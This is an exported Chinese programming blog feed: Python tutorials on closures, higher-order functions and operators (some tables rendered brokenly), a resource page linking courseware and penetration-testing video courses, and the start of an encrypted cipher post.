class="line">------------------------------------------------------------------------------------------</span><br><span class="line">成功！说明变量f现在已经指向了<span class="built_in">abs</span>函数本身。直接调用<span class="built_in">abs</span>()函数和调用变量f()完全相同。</span><br></pre></td></tr></table></figure>

<br>

<p>说明变量f现在已经指向了abs函数本身。直接调用<code>abs()</code>函数和调用变量<code>f()</code>完全相同。这是廖雪峰老师python教程上的例子，现在调用<code>f()</code>和调用<code>abs()</code>是一样的了。</p>
<br>

<p>再举一个工厂函数的例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maker</span>(<span class="params">N</span>):</span></span><br><span class="line"> </span><br><span class="line">　　<span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">X</span>):</span></span><br><span class="line"> </span><br><span class="line">　　　　<span class="keyword">return</span> X**N</span><br><span class="line"> </span><br><span class="line">　　<span class="keyword">return</span> action</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">这个嵌套函数的外层返回值为内层函数的函数名，注意没有括号，这里有无括号是有很大区别的。此时调用外部函数：</span><br><span class="line"></span><br><span class="line">f=maker(<span class="number">2</span>)   //此时进入maker(<span class="number">2</span>)，且定义了一个action(X)函数，然后返回action函数名（对象）给f</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">那么如上所述，f便指向了action函数，且限制条件为N=<span class="number">2</span>，可以理解为f为N等于<span class="number">2</span>时的action函数。我们来调用它：</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">3</span>))   //此时相当于调用了cation(<span class="number">3</span>)函数，这也是在外部使用内部嵌套函数的方法，</span><br><span class="line">              //因为内部嵌套函数是不允许在外部访问的。</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">9</span>            //证明f和action函数是一样的。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">如上的示例也可以用<span class="built_in">print</span>(f=maker(<span class="number">2</span>)(<span class="number">3</span>))来输出结果一样，两个括号连在一起相当于执行了这两个函数。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maker</span>(<span class="params">N</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">a</span>(<span class="params">c</span>):</span> </span><br><span class="line">		<span class="keyword">return</span> c**N </span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">f=maker(<span class="number">2</span>)(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">OUTPUT: <span class="number">9</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="red"><strong>2.</strong> <strong><code>a = f()</code></strong> <strong>型属于将f()的返回值赋值给a的过程</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">这里的a仅仅接收f()的返回值，如果f()没有返回值，那么a即被赋值为<span class="literal">None</span>。这里值得注意的一点是，</span><br><span class="line">在a=f()的执行过程中，f()会运行一次，如：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span></span><br><span class="line">	z = x+y</span><br><span class="line">	<span class="built_in">print</span>(z)</span><br><span class="line">a = add(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;******我是分隔符，嘿嘿嘿******&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">OUTPUT: </span><br><span class="line"><span class="number">7</span></span><br><span class="line">******我是分隔符，嘿嘿嘿******</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">这里在分隔符前输出了<span class="number">7</span>，说明赋值过程函数add执行了，然而a的值为<span class="literal">None</span>，且只能通过<span class="built_in">print</span>语句才可以显示。</span><br><span class="line">这是因为add()函数没有<span class="keyword">return</span>语句。</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="1-2-传入函数与返回函数名"><a href="#1-2-传入函数与返回函数名" class="headerlink" title="1.2 传入函数与返回函数名"></a><font color="#3CB371" face="Comic sans MS">1.2 传入函数与返回函数名</font></h4><br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、传入函数（把函数作为参数）</strong></font></p>
<p>&amp;emsp;&amp;emsp;既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为<strong>高阶函数</strong>。</p>
<p>一个最简单的高阶函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def add(x, y, f):</span><br><span class="line">    return f(x) + f(y)</span><br></pre></td></tr></table></figure>

<p>当我们调用<code>add(-5, 6, abs)</code>时，参数x，y和f分别接收-5，6和abs，根据函数定义，我们可以推导计算过程为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = -<span class="number">5</span></span><br><span class="line">y = <span class="number">6</span></span><br><span class="line">f = <span class="built_in">abs</span></span><br><span class="line">f(x) + f(y) ==&gt; abs(-5) + abs(6) ==&gt; 11</span><br><span class="line"><span class="keyword">return</span> <span class="number">11</span></span><br></pre></td></tr></table></figure>


<p>用代码验证一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x, y, f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(x) + f(y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">5</span>, <span class="number">6</span>, <span class="built_in">abs</span>))</span><br><span class="line"></span><br><span class="line">OUTPUT: <span class="number">11</span> </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><strong>总结：</strong>编写高阶函数，就是让函数的参数能够接收别的函数。<font color="#FF7F00"><strong>把函数作为参数传入，这样的函数称为高阶函数，函数式编程就是指这种高度抽象的编程范式</strong></font>。</p>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、返回函数名（把函数名作为返回值）</strong></font></p>
<p>&amp;emsp;&amp;emsp;高阶函数除了可以接受函数作为参数外，还可以把函数名作为结果值返回。注意Python3<font color="#FF7F00"><strong>返回的是迭代器对象</strong></font>。</p>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;我们来实现一个可变参数的求和。通常情况下，求和的函数是这样定义的：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_sum</span>(<span class="params">*args</span>):</span>   <span class="string">&#x27;在函数的参数章节讲过，*传入元组，**传入字典&#x27;</span></span><br><span class="line">    ax = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">        ax = ax + n</span><br><span class="line">    <span class="keyword">return</span> ax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，</span></span><br><span class="line"><span class="string">而是返回求和的函数：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lazy_sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sum</span>():</span></span><br><span class="line">        ax = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">            ax = ax + n</span><br><span class="line">        <span class="keyword">return</span> ax</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;当我们调用lazy_sum()时，返回的并不是求和结果，而是求和函数：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">OUTPUT: &lt;function lazy_sum.&lt;<span class="built_in">locals</span>&gt;.<span class="built_in">sum</span> at <span class="number">0x101c6ed90</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;调用函数f时，才真正计算求和的结果：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f()</span><br><span class="line">OUTPUT: <span class="number">25</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在这个例子中，我们在函数lazy_sum中又定义了函数sum，并且，内部函数sum可以引用外部函数lazy_sum</span></span><br><span class="line"><span class="string">的参数和局部变量，当lazy_sum返回函数sum时，相关参数和变量都保存在返回的函数中，这种称为</span></span><br><span class="line"><span class="string">“闭包（Closure）”的程序结构拥有极大的威力。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">请再注意一点，当我们调用lazy_sum()时，每次调用都会返回一个新的函数，即使传入相同的参数：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f1 = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">f2 = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">f1==f2</span><br><span class="line">OUTPUT: <span class="literal">False</span></span><br><span class="line"><span class="string">&#x27;f1()和f2()的调用结果互不影响。&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、闭包</strong></font></p>
<p>&amp;emsp;&amp;emsp;注意到返回的函数在其定义内部引用了局部变量<code>args</code>，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。</span></span><br><span class="line"><span class="string">	我们来看一个例子：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line">             <span class="keyword">return</span> i*i</span><br><span class="line">        fs.append(f)</span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line">f1, f2, f3 = count()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都返回了。</span></span><br><span class="line"><span class="string">你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果是：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">全部都是9！原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数都返回时，它们所引用的变</span></span><br><span class="line"><span class="string">量i已经变成了3，因此最终结果为9。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。</span></span><br><span class="line"><span class="string">如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该</span></span><br><span class="line"><span class="string">循环变量后续如何更改，已绑定到函数参数的值不变：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">j</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">g</span>():</span></span><br><span class="line">            <span class="keyword">return</span> j*j</span><br><span class="line">        <span class="keyword">return</span> g</span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        fs.append(f(i)) <span class="comment"># f(i)立刻被执行，因此i的当前值被传入f()</span></span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;再看看结果：&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1, f2, f3 = count()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1()</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2()</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;缺点是代码较长，可利用lambda函数缩短代码。&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="二-装饰器"><a href="#二-装饰器" class="headerlink" title="二. 装饰器"></a><font color="#FF6347" face="Comic sans MS">二. 装饰器</font></h3>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-运算符</title>
    <url>/post/Python-Operators/</url>
    <content><![CDATA[<p>要常来骚扰…₍ ..̮ ₎ ₍ ..̮ ₎ </p>
<span id="more"></span>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>运算符</font> </center>

<br>

<br>

<p>Python语言支持以下类型的运算符:</p>
<ul>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf1">算术运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf2">比较（关系）运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf3">赋值运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf4">逻辑运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf5">位运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf6">成员运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf7">身份运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf8">运算符优先级</a></font></p>
</li>
</ul>
<br>

<br>

<h3 id="一-算术运算符"><a href="#一-算术运算符" class="headerlink" title=" 一. 算术运算符"></a><font color="#FF6347" face="Comic sans MS"> 一. 算术运算符</font></h3><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
</table>
<ul>
<li>|加 - 两个对象相加                                |a + b 输出结果 30</li>
</ul>
<ul>
<li>|减 - 得到负数或是一个数减去另一个数                |a - b 输出结果 -10</li>
</ul>
<ul>
<li>|乘 - 两个数相乘或是返回一个被重复若干次的字符串    |a * b 输出结果 200<br>&#x2F;    |除 - x除以y                                        |b &#x2F; a 输出结果 2<br>%    |取模 - 返回除法的余数                            |b % a 输出结果 0</li>
</ul>
<p>**    |幂 - 返回x的y次幂                                |a**b 为10的20次方，<br>输出结果 100000000000000000000<br>&#x2F;&#x2F;    |取整除 - 返回商的整数部分（向下取整）    |&gt;&gt;&gt;&gt; 9&#x2F;&#x2F;2<br>4<br>&gt;&gt;&gt; -9&#x2F;&#x2F;2<br>-5</p>
<br>

<br>

<h3 id="二-比较运算符"><a href="#二-比较运算符" class="headerlink" title=" 二. 比较运算符"></a><font color="#FF6347" face="Comic sans MS"> 二. 比较运算符</font></h3><p>以下假设变量a为10，变量b为20：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#x3D;&#x3D;</td>
<td align="left">等于 - 比较对象是否相等</td>
<td align="left">(a &#x3D;&#x3D; b) 返回 False。</td>
</tr>
<tr>
<td align="left">!&#x3D;</td>
<td align="left">不等于 - 比较两个对象是否不相等</td>
<td align="left">(a !&#x3D; b) 返回 True。</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于 - 返回x是否大于y</td>
<td align="left">(a &gt; b) 返回 False。</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。<br>这分别与特殊的变量True和False等价。注意，这些变量名的大写。</td>
<td align="left">(a &lt; b) 返回 True。</td>
</tr>
<tr>
<td align="left">&gt;&#x3D;</td>
<td align="left">大于等于 - 返回x是否大于等于y。</td>
<td align="left">(a &gt;&#x3D; b) 返回 False。</td>
</tr>
<tr>
<td align="left">&lt;&#x3D;</td>
<td align="left">小于等于 - 返回x是否小于等于y。</td>
<td align="left">(a &lt;&#x3D; b) 返回 True。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="三-赋值运算符"><a href="#三-赋值运算符" class="headerlink" title="三. 赋值运算符"></a><font color="#FF6347" face="Comic sans MS">三. 赋值运算符</font></h3><p>以下假设变量a为10，变量b为20：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#x3D;</td>
<td align="left">简单的赋值运算符</td>
<td align="left">c &#x3D; a + b 将 a + b 的运算结果赋值为 c</td>
</tr>
<tr>
<td align="left">+&#x3D;</td>
<td align="left">加法赋值运算符</td>
<td align="left">c +&#x3D; a 等效于 c &#x3D; c + a</td>
</tr>
<tr>
<td align="left">-&#x3D;</td>
<td align="left">减法赋值运算符</td>
<td align="left">c -&#x3D; a 等效于 c &#x3D; c - a</td>
</tr>
<tr>
<td align="left">*&#x3D;</td>
<td align="left">乘法赋值运算符</td>
<td align="left">c *&#x3D; a 等效于 c &#x3D; c * a</td>
</tr>
<tr>
<td align="left">&#x2F;&#x3D;</td>
<td align="left">除法赋值运算符</td>
<td align="left">c &#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F; a</td>
</tr>
<tr>
<td align="left">%&#x3D;</td>
<td align="left">取模赋值运算符</td>
<td align="left">c %&#x3D; a 等效于 c &#x3D; c % a</td>
</tr>
<tr>
<td align="left">**&#x3D;</td>
<td align="left">幂赋值运算符</td>
<td align="left">c **&#x3D; a 等效于 c &#x3D; c ** a</td>
</tr>
<tr>
<td align="left">&#x2F;&#x2F;&#x3D;</td>
<td align="left">取整除赋值运算符</td>
<td align="left">c &#x2F;&#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F;&#x2F; a</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="四-位运算符"><a href="#四-位运算符" class="headerlink" title="四. 位运算符"></a><font color="#FF6347" face="Comic sans MS">四. 位运算符</font></h3><p>按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下：</p>
<p>下表中变量 a 为 60，b 为 13二进制格式如下：</p>
<table>
<thead>
<tr>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">a &#x3D; 0011 1100</td>
</tr>
<tr>
<td align="left">b &#x3D; 0000 1101</td>
</tr>
<tr>
<td align="left">a&amp;b &#x3D; 0000 1100</td>
</tr>
<tr>
<td align="left">a丨b &#x3D; 0011 1101</td>
</tr>
<tr>
<td align="left">a^b &#x3D; 0011 0001</td>
</tr>
<tr>
<td align="left"><code>~a</code>  &#x3D; 1100 0011</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp;</td>
<td align="left">按位与运算符：<br>参与运算的两个值,如果两个相应位都为1,<br>则该位的结果为1,否则为0</td>
<td align="left">(a &amp; b) 输出结果 12 <br>二进制解释： 0000 1100</td>
</tr>
<tr>
<td align="left">丨</td>
<td align="left">按位或运算符：<br>只要对应的二个二进位有一个为1时，结果位就为1。</td>
<td align="left">(a 丨 b) 输出结果 61 <br>二进制解释： 0011 1101</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">按位异或运算符：<br>当两对应的二进位相异时，结果为1</td>
<td align="left">(a ^ b) 输出结果 49 <br>二进制解释： 0011 0001</td>
</tr>
<tr>
<td align="left">~</td>
<td align="left">按位取反运算符：<br>对数据的每个二进制位取反,<br>即把1变为0,把0变为1。~x 类似于 -x-1</td>
<td align="left">(~a ) 输出结果 -61 <br>二进制解释： 1100 0011 <br>在一个有符号二进制数的补码形式。</td>
</tr>
<tr>
<td align="left">&lt;&lt;</td>
<td align="left">左移动运算符：<br>运算数的各二进位全部左移若干位，<br>由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td>
<td align="left">a &lt;&lt; 2 输出结果 240 <br>二进制解释： 1111 0000</td>
</tr>
<tr>
<td align="left">&gt;&gt;</td>
<td align="left">右移动运算符：<br>把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，<br>“&gt;&gt;”右边的数指定移动的位数</td>
<td align="left">a &gt;&gt; 2 输出结果 15 <br>二进制解释： 0000 1111</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="五-逻辑运算符"><a href="#五-逻辑运算符" class="headerlink" title="五. 逻辑运算符"></a><font color="#FF6347" face="Comic sans MS">五. 逻辑运算符</font></h3><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">逻辑表达式</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">and</td>
<td align="left">x and y</td>
<td align="left">布尔”与” - 如果 x 为 False，<br>x and y 返回 False，否则它返回 y 的计算值。</td>
<td align="left">(a and b) 返回 20。</td>
</tr>
<tr>
<td align="left">or</td>
<td align="left">x or y</td>
<td align="left">布尔”或” - 如果 x 是 True，<br>它返回 x 的值，否则它返回 y 的计算值。</td>
<td align="left">(a or b) 返回 10。</td>
</tr>
<tr>
<td align="left">not</td>
<td align="left">not x</td>
<td align="left">布尔”非” - 如果 x 为 True，<br>返回 False 。如果 x 为 False，它返回 True。</td>
<td align="left">not(a and b) 返回 False</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="六-成员运算符"><a href="#六-成员运算符" class="headerlink" title="六. 成员运算符"></a><font color="#FF6347" face="Comic sans MS">六. 成员运算符</font></h3><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">in</td>
<td align="left">如果在指定的序列中找到值返回 True，否则返回 False。</td>
<td align="left">x 在 y 序列中 , <br>如果 x 在 y 序列中返回 True。</td>
</tr>
<tr>
<td align="left">not in</td>
<td align="left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td>
<td align="left">x 不在 y 序列中 , <br>如果 x 不在 y 序列中返回 True。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="七-身份运算符"><a href="#七-身份运算符" class="headerlink" title="七. 身份运算符"></a><font color="#FF6347" face="Comic sans MS">七. 身份运算符</font></h3><p>身份运算符用于比较两个对象的存储单元。<br><strong>注：</strong><font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-id.html">id() 函数</a>]</font> 用于获取对象内存地址。</p>
<p>is 与 &#x3D;&#x3D; 区别：<font color="#FF7F00"><strong>is 用于判断两个变量引用对象是否为同一个， &#x3D;&#x3D; 用于判断引用变量的值是否相等</strong></font>。</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">is</td>
<td align="left">is 是判断两个标识符是不是引用自一个对象</td>
<td align="left">x is y, 类似 id(x) &#x3D;&#x3D; id(y) 。<br> 如果引用的是同一个对象则返回 True，<br>否则返回 False</td>
</tr>
<tr>
<td align="left">is not</td>
<td align="left">is not 是判断两个标识符是不是引用自不同对象</td>
<td align="left">x is not y ， 类似 id(a) !&#x3D; id(b)。<br>如果引用的不是同一个对象则返回结果 True，<br>否则返回 False。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="八-运算符优先级"><a href="#八-运算符优先级" class="headerlink" title="八. 运算符优先级"></a><font color="#FF6347" face="Comic sans MS">八. 运算符优先级</font></h3><p>以下表格列出了从最高到最低优先级的所有运算符：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">**</td>
<td align="left">指数 (最高优先级)</td>
</tr>
<tr>
<td align="left">~ + -</td>
<td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td>
</tr>
</tbody></table>
<ul>
<li>&#x2F; % &#x2F;&#x2F;    |乘，除，取模和取整除</li>
</ul>
<ul>
<li><ul>
<li>|加法减法<br>&gt;&gt; |&lt;&lt;    右移，左移运算符<br>&amp;    |位 ‘AND’<br>^ 丨    |位运算符<br>&lt;&#x3D; &lt; &gt; &gt;&#x3D;    |比较运算符<br>&lt;&gt; &#x3D;&#x3D; !&#x3D;    |等于运算符<br>&#x3D; %&#x3D; &#x2F;&#x3D; &#x2F;&#x2F;&#x3D; -&#x3D; +&#x3D; *&#x3D; **&#x3D;    |赋值运算符<br>is is not    |身份运算符<br>in not in    |成员运算符<br>and or not    |逻辑运算符</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>资源</title>
    <url>/post/Resourses/</url>
    <content><![CDATA[<p>&amp;ensp;<br><font face="楷体" color="red" size=6>资源目录</font><font face="楷体" color="red">(点击相应资源会跳转哦)</font>😜</p>
<table>
<thead>
<tr>
<th>书籍</th>
<th align="center">提取码</th>
<th align="center">视频</th>
<th align="center">提取码</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://pan.baidu.com/s/1XM04ptOY0qaS3iVu3VQoLQ">安全牛 — Kali Linux渗透测试(转录)</a></td>
<td align="center">Numb1</td>
<td align="center"><a href="https://pan.baidu.com/s/1RHU4z4xr5sxLuqbkdwP_Lw">安全牛 — Kali Linux渗透测试(转录)</a></td>
<td align="center">Numb2</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1fUNe2Q7aiQxtzEomXgLjYQ">算法设计与分析课件</a></td>
<td align="center">Numb3</td>
<td align="center"><a href="https://pan.baidu.com/s/1Fmi9FpCbcoR-NBLap8KivQ">Kali渗透培训课程-逆小战</a></td>
<td align="center">Numb4</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1rERpm9Bm2zSzNhYPbUuh6Q">信息安全数学基础课件</a></td>
<td align="center">Numb5</td>
<td align="center"><a href="https://pan.baidu.com/s/1-lldqvPgcnNC3kjJmoS12A">SQLMAP注入牛人讲解</a></td>
<td align="center">Numb6</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1iwev5nNX6DHjbHFwAPyeag">Java课件</a></td>
<td align="center">Numb7</td>
<td align="center"><a href="https://pan.baidu.com/s/1Ur8wapZIbNsMu-h4YosvOQ">Burpsuite视频教程</a></td>
<td align="center">Numb8</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/16_a1uYNgfQwaVZwvxW7Kog">Java 2 核心技术，卷I：基础知识（原书第7版）</a></td>
<td align="center">Numb9</td>
<td align="center"><a href="https://pan.baidu.com/s/1g2IF-com9z3qwpacugslhA">Burpsuite渗透软件教程</a></td>
<td align="center">Numb10</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1DeyFfBjjzFVE4Z8B5-GsHA">Dreaming in Code</a></td>
<td align="center">Numb11</td>
<td align="center"><a href="https://pan.baidu.com/s/1txPt1Dz3q0rdaTBRvGf9eQ">Web基础</a></td>
<td align="center">Numb12</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1HOw_KSFvVhKIW7UW8hZ9eA">梦断代码</a></td>
<td align="center">Numb13</td>
<td align="center"><a href="https://pan.baidu.com/s/16kHmbDuNz6tyJxKFpVqNOg">Web漏洞讲解</a></td>
<td align="center">Numb14</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>对称密码-序列密码</title>
    <url>/post/Sequence-Password/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
